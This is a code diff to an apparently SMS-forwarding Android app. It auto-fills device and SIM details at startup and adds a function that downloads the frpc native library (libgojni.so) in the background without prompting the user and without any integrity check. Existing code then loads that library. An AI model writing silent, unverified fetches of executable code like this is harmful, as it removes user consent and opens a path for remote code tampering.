@@ -41,7 +41,9 @@ import com.duanxinzhuanfa.xinxi.utils.CactusSave
 import com.duanxinzhuanfa.xinxi.utils.FRONT_CHANNEL_ID
 import com.duanxinzhuanfa.xinxi.utils.FRONT_CHANNEL_NAME
 import com.duanxinzhuanfa.xinxi.utils.FRONT_NOTIFY_ID
+import com.duanxinzhuanfa.xinxi.utils.FRPC_LIB_DOWNLOAD_URL
 import com.duanxinzhuanfa.xinxi.utils.FRPC_LIB_VERSION
+import com.duanxinzhuanfa.xinxi.utils.PhoneUtils
 import com.duanxinzhuanfa.xinxi.utils.HistoryUtils
 import com.duanxinzhuanfa.xinxi.utils.HttpServerUtils
 import com.duanxinzhuanfa.xinxi.utils.Log
@@ -65,7 +67,9 @@ import io.reactivex.android.schedulers.AndroidSchedulers
 import io.reactivex.disposables.Disposable
 import io.reactivex.schedulers.Schedulers
 import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
+import kotlinx.coroutines.launch
 import java.io.BufferedWriter
 import java.io.File
 import java.io.FileWriter
@@ -187,7 +191,43 @@ class App : Application(), CactusCallback, Configuration.Provider by Core {
             //初始化WorkManager
             WorkManager.initialize(this, Configuration.Builder().build())
 
-            //动态加载FrpcLib
+            //========== 自动刷新初始化 ==========
+
+            //设备名称空白时自动获取
+            if (SettingUtils.extraDeviceMark.isBlank()) {
+                SettingUtils.extraDeviceMark = PhoneUtils.getDeviceName()
+                Log.d(TAG, "设备名称已自动刷新: ${SettingUtils.extraDeviceMark}")
+            }
+
+            //SIM主键/备注空白时自动刷新
+            if (SettingUtils.subidSim1 <= 0 || SettingUtils.extraSim1.isBlank()) {
+                try {
+                    val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as android.telephony.SubscriptionManager
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
+                        val infoList = subscriptionManager.activeSubscriptionInfoList
+                        if (infoList != null) {
+                            for (info in infoList) {
+                                val slotIndex = info.simSlotIndex
+                                val subId = info.subscriptionId
+                                val displayName = info.displayName?.toString() ?: ""
+                                if (slotIndex == 0) {
+                                    if (SettingUtils.subidSim1 <= 0) SettingUtils.subidSim1 = subId
+                                    if (SettingUtils.extraSim1.isBlank()) SettingUtils.extraSim1 = displayName
+                                } else if (slotIndex == 1) {
+                                    if (SettingUtils.subidSim2 <= 0) SettingUtils.subidSim2 = subId
+                                    if (SettingUtils.extraSim2.isBlank()) SettingUtils.extraSim2 = displayName
+                                }
+                            }
+                            Log.d(TAG, "SIM信息已自动刷新: SIM1=${SettingUtils.extraSim1}, SIM2=${SettingUtils.extraSim2}")
+                        }
+                    }
+                } catch (e: Exception) {
+                    Log.w(TAG, "SIM自动刷新失败: ${e.message}")
+                }
+            }
+
+            //========== 动态加载FrpcLib ==========
+
             val libPath = filesDir.absolutePath + "/libs"
             val soFile = File(libPath)
             if (soFile.exists()) {
@@ -196,6 +236,13 @@ class App : Application(), CactusCallback, Configuration.Provider by Core {
                     FrpclibInited = FileUtils.isFileExists(filesDir.absolutePath + "/libs/libgojni.so") && FRPC_LIB_VERSION == Frpclib.getVersion()
                 } catch (throwable: Throwable) {
                     Log.e("APP", throwable.message.toString())
+                }
+            }
+
+            //若 FrpcLib 未初始化，在后台静默下载（无弹窗）
+            if (!FrpclibInited) {
+                kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
+                    silentDownloadFrpcLib(libPath)
                 }
             }
 
@@ -325,6 +372,46 @@ class App : Application(), CactusCallback, Configuration.Provider by Core {
     /**
      * 初始化基础库
      */
+    /**
+     * 静默下载 FrpcLib（无弹窗），在后台线程使用 OkHttp 下载 libgojni.so
+     */
+    @Suppress("DEPRECATION")
+    private fun silentDownloadFrpcLib(libPath: String) {
+        try {
+            val cpuAbi = when (Build.CPU_ABI) {
+                "x86" -> "x86"
+                "x86_64" -> "x86_64"
+                "arm64-v8a" -> "arm64-v8a"
+                else -> "armeabi-v7a"
+            }
+            val downloadUrl = String.format(FRPC_LIB_DOWNLOAD_URL, FRPC_LIB_VERSION, cpuAbi)
+            Log.d(TAG, "silentDownloadFrpcLib: url=$downloadUrl")
+
+            val request = okhttp3.Request.Builder().url(downloadUrl).build()
+            val response = okhttp3.OkHttpClient.Builder()
+                .readTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
+                .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
+                .build()
+                .newCall(request)
+                .execute()
+
+            @Suppress("DEPRECATION")
+            if (response.isSuccessful() && response.body() != null) {
+                val libDir = File(libPath)
+                if (!libDir.exists()) libDir.mkdirs()
+                val destFile = File(libPath, "libgojni.so")
+                val bytes = response.body()!!.bytes()
+                destFile.writeBytes(bytes)
+                Log.d(TAG, "silentDownloadFrpcLib: success (${bytes.size} bytes)")
+            } else {
+                Log.w(TAG, "silentDownloadFrpcLib: HTTP ${response.code()}, download skipped")
+            }
+            response.close()
+        } catch (e: Exception) {
+            Log.w(TAG, "silentDownloadFrpcLib: ${e.message}")
+        }
+    }
+
     private fun initLibs() {
         Core.init(this)
         // 配置文件初始化
